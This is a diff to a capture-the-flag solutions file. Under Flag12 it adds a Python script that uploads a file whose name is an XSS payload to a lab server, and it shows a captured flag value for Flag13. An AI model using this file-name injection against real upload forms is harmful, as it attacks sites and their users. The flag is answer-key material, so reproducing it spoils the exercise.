@@ -164,6 +164,27 @@ https://onlinehextools.com/xor-hex-numbers
 # Flag11
 
 # Flag12
+```
+#!/usr/bin/env python3
+
+import requests
+
+url = 'http://129.241.200.165:19680//?page=upload'
+
+f = {
+        'uploaded':                                 # .. from <form> element in html
+            ("<script>alert('xss')</script>",       # file name
+                'file_contents',                    # actual file contents, normaly `open(fn, 'rb')`
+                'image/jpeg')                       # content-type
+        }
+
+d = {
+        'Upload': 'Upload'                          # from <form> element in html
+        }
+
+r = requests.post(url, files=f, data=d)
+print(r.text)
+```
 
 # Flag13
 Congratulations Flag13 is 6bad301f529ea136b3427e9daf2e6b2e
